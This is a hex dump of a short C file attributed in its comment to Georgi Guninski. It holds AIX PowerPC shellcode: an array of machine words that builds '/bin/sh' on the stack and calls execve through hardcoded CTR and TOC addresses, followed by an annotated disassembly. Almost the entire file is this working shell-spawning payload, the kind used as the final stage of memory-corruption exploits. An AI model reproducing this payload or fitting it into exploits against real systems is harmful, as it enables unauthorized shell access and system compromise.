00000000  2f 2a 0d 0a 20 2a 20 20  41 69 78 0d 0a 20 2a 20  |/*.. *  Aix.. * |
00000010  20 65 78 65 63 76 65 28  29 20 6f 66 20 2f 62 69  | execve() of /bi|
00000020  6e 2f 73 68 20 47 65 6f  72 67 69 20 47 75 6e 69  |n/sh Georgi Guni|
00000030  6e 73 6b 69 20 28 67 75  6e 69 6e 73 6b 69 40 68  |nski (guninski@h|
00000040  6f 74 6d 61 69 6c 2e 63  6f 6d 29 0d 0a 20 2a 2f  |otmail.com).. */|
00000050  0d 0a 0d 0a 75 6e 73 69  67 6e 65 64 20 69 6e 74  |....unsigned int|
00000060  20 63 6f 64 65 5b 5d 3d  7b 0d 0a 20 20 30 78 37  | code[]={..  0x7|
00000070  63 30 38 30 32 61 36 20  2c 20 30 78 39 34 32 31  |c0802a6 , 0x9421|
00000080  66 62 62 30 20 2c 20 30  78 39 30 30 31 30 34 35  |fbb0 , 0x9001045|
00000090  38 20 2c 20 30 78 33 63  36 30 66 30 31 39 20 2c  |8 , 0x3c60f019 ,|
000000a0  0d 0a 20 20 30 78 36 30  36 33 32 63 34 38 20 2c  |..  0x60632c48 ,|
000000b0  20 30 78 39 30 36 31 30  34 34 30 20 2c 20 30 78  | 0x90610440 , 0x|
000000c0  33 63 36 30 64 30 30 32  20 2c 20 30 78 36 30 36  |3c60d002 , 0x606|
000000d0  33 34 63 30 63 20 2c 0d  0a 20 20 30 78 39 30 36  |34c0c ,..  0x906|
000000e0  31 30 34 34 34 20 2c 20  30 78 33 63 36 30 32 66  |10444 , 0x3c602f|
000000f0  36 32 20 2c 20 30 78 36  30 36 33 36 39 36 65 20  |62 , 0x6063696e |
00000100  2c 20 30 78 39 30 36 31  30 34 33 38 20 2c 0d 0a  |, 0x90610438 ,..|
00000110  20 20 30 78 33 63 36 30  32 66 37 33 20 2c 20 30  |  0x3c602f73 , 0|
00000120  78 36 30 36 33 36 38 30  31 20 2c 20 30 78 33 38  |x60636801 , 0x38|
00000130  36 33 66 66 66 66 20 2c  20 30 78 39 30 36 31 30  |63ffff , 0x90610|
00000140  34 33 63 20 2c 0d 0a 20  20 30 78 33 30 36 31 30  |43c ,..  0x30610|
00000150  34 33 38 20 2c 20 30 78  37 63 38 34 32 32 37 38  |438 , 0x7c842278|
00000160  20 2c 20 30 78 38 30 34  31 30 34 34 30 20 2c 20  | , 0x80410440 , |
00000170  30 78 38 30 30 31 30 34  34 34 20 2c 0d 0a 20 20  |0x80010444 ,..  |
00000180  30 78 37 63 30 39 30 33  61 36 20 2c 20 30 78 34  |0x7c0903a6 , 0x4|
00000190  65 38 30 30 34 32 30 2c  20 30 78 30 0d 0a 7d 3b  |e800420, 0x0..};|
000001a0  0d 0a 0d 0a 2f 2a 20 20  20 20 20 20 64 69 73 61  |..../*      disa|
000001b0  73 73 65 6d 62 6c 79 0d  0a 20 20 37 63 30 38 30  |ssembly..  7c080|
000001c0  32 61 36 20 20 20 20 20  20 20 20 6d 66 73 70 72  |2a6        mfspr|
000001d0  20 20 20 72 30 2c 4c 52  0d 0a 20 20 39 34 32 31  |   r0,LR..  9421|
000001e0  66 62 62 30 20 20 20 20  20 20 20 20 73 74 75 20  |fbb0        stu |
000001f0  20 20 20 20 53 50 2c 2d  31 31 30 34 28 53 50 29  |    SP,-1104(SP)|
00000200  20 2d 2d 67 65 74 20 73  74 61 63 6b 0d 0a 20 20  | --get stack..  |
00000210  39 30 30 31 30 34 35 38  20 20 20 20 20 20 20 20  |90010458        |
00000220  73 74 20 20 20 20 20 20  72 30 2c 31 31 31 32 28  |st      r0,1112(|
00000230  53 50 29 0d 0a 20 20 33  63 36 30 66 30 31 39 20  |SP)..  3c60f019 |
00000240  20 20 20 20 20 20 20 63  61 75 20 20 20 20 20 72  |       cau     r|
00000250  33 2c 72 30 2c 30 78 66  30 31 39 20 2d 2d 43 54  |3,r0,0xf019 --CT|
00000260  52 0d 0a 20 20 36 30 36  33 32 63 34 38 20 20 20  |R..  60632c48   |
00000270  20 20 20 20 20 6c 69 73  20 20 20 20 20 72 33 2c  |     lis     r3,|
00000280  72 33 2c 31 31 33 33 36  20 20 2d 2d 43 54 52 0d  |r3,11336  --CTR.|
00000290  0a 20 20 39 30 36 31 30  34 34 30 20 20 20 20 20  |.  90610440     |
000002a0  20 20 20 73 74 20 20 20  20 20 20 72 33 2c 31 30  |   st      r3,10|
000002b0  38 38 28 53 50 29 0d 0a  20 20 33 63 36 30 64 30  |88(SP)..  3c60d0|
000002c0  30 32 20 20 20 20 20 20  20 20 63 61 75 20 20 20  |02        cau   |
000002d0  20 20 72 33 2c 72 30 2c  30 78 64 30 30 32 20 2d  |  r3,r0,0xd002 -|
000002e0  2d 54 4f 43 0d 0a 20 20  36 30 36 33 34 63 30 63  |-TOC..  60634c0c|
000002f0  20 20 20 20 20 20 20 20  6c 69 73 20 20 20 20 20  |        lis     |
00000300  72 33 2c 72 33 2c 31 39  34 36 38 20 20 2d 2d 54  |r3,r3,19468  --T|
00000310  4f 43 0d 0a 20 20 39 30  36 31 30 34 34 34 20 20  |OC..  90610444  |
00000320  20 20 20 20 20 20 73 74  20 20 20 20 20 20 72 33  |      st      r3|
00000330  2c 31 30 39 32 28 53 50  29 0d 0a 20 20 33 63 36  |,1092(SP)..  3c6|
00000340  30 32 66 36 32 20 20 20  20 20 20 20 20 63 61 75  |02f62        cau|
00000350  20 20 20 20 20 72 33 2c  72 30 2c 30 78 32 66 36  |     r3,r0,0x2f6|
00000360  32 20 2d 2d 27 2f 62 69  6e 2f 73 68 5c 78 30 31  |2 --'/bin/sh\x01|
00000370  27 0d 0a 20 20 36 30 36  33 36 39 36 65 20 20 20  |'..  6063696e   |
00000380  20 20 20 20 20 6c 69 73  20 20 20 20 20 72 33 2c  |     lis     r3,|
00000390  72 33 2c 32 36 39 39 30  0d 0a 20 20 39 30 36 31  |r3,26990..  9061|
000003a0  30 34 33 38 20 20 20 20  20 20 20 20 73 74 20 20  |0438        st  |
000003b0  20 20 20 20 72 33 2c 31  30 38 30 28 53 50 29 0d  |    r3,1080(SP).|
000003c0  0a 20 20 33 63 36 30 32  66 37 33 20 20 20 20 20  |.  3c602f73     |
000003d0  20 20 20 63 61 75 20 20  20 20 20 72 33 2c 72 30  |   cau     r3,r0|
000003e0  2c 30 78 32 66 37 33 0d  0a 20 20 36 30 36 33 36  |,0x2f73..  60636|
000003f0  38 30 31 20 20 20 20 20  20 20 20 6c 69 73 20 20  |801        lis  |
00000400  20 20 20 72 33 2c 72 33  2c 32 36 36 32 35 0d 0a  |   r3,r3,26625..|
00000410  20 20 33 38 36 33 66 66  66 66 20 20 20 20 20 20  |  3863ffff      |
00000420  20 20 61 64 64 69 20 20  20 20 72 33 2c 72 33 2c  |  addi    r3,r3,|
00000430  2d 31 0d 0a 20 20 39 30  36 31 30 34 33 63 20 20  |-1..  9061043c  |
00000440  20 20 20 20 20 20 73 74  20 20 20 20 20 20 72 33  |      st      r3|
00000450  2c 31 30 38 34 28 53 50  29 20 2d 2d 74 65 72 6d  |,1084(SP) --term|
00000460  69 6e 61 74 65 20 77 69  74 68 20 30 0d 0a 20 20  |inate with 0..  |
00000470  33 30 36 31 30 34 33 38  20 20 20 20 20 20 20 20  |30610438        |
00000480  6c 69 73 20 20 20 20 20  72 33 2c 53 50 2c 31 30  |lis     r3,SP,10|
00000490  38 30 0d 0a 20 20 37 63  38 34 32 32 37 38 20 20  |80..  7c842278  |
000004a0  20 20 20 20 20 20 78 6f  72 20 20 20 20 20 72 34  |      xor     r4|
000004b0  2c 72 34 2c 72 34 20 20  20 20 2d 2d 61 72 67 76  |,r4,r4    --argv|
000004c0  3d 4e 55 4c 4c 0d 0a 20  20 38 30 34 31 30 34 34  |=NULL..  8041044|
000004d0  30 20 20 20 20 20 20 20  20 6c 77 7a 20 20 20 20  |0        lwz    |
000004e0  20 52 54 4f 43 2c 31 30  38 38 28 53 50 29 0d 0a  | RTOC,1088(SP)..|
000004f0  20 20 38 30 30 31 30 34  34 34 20 20 20 20 20 20  |  80010444      |
00000500  20 20 6c 77 7a 20 20 20  20 20 72 30 2c 31 30 39  |  lwz     r0,109|
00000510  32 28 53 50 29 20 2d 2d  6a 75 6d 70 0d 0a 20 20  |2(SP) --jump..  |
00000520  37 63 30 39 30 33 61 36  20 20 20 20 20 20 20 20  |7c0903a6        |
00000530  6d 74 73 70 72 20 20 20  43 54 52 2c 72 30 0d 0a  |mtspr   CTR,r0..|
00000540  20 20 34 65 38 30 30 34  32 30 20 20 20 20 20 20  |  4e800420      |
00000550  20 20 62 63 74 72 20 20  20 20 20 20 20 20 20 20  |  bctr          |
00000560  20 20 20 20 2d 2d 6a 75  6d 70 0d 0a 2a 2f        |    --jump..*/|
0000056e
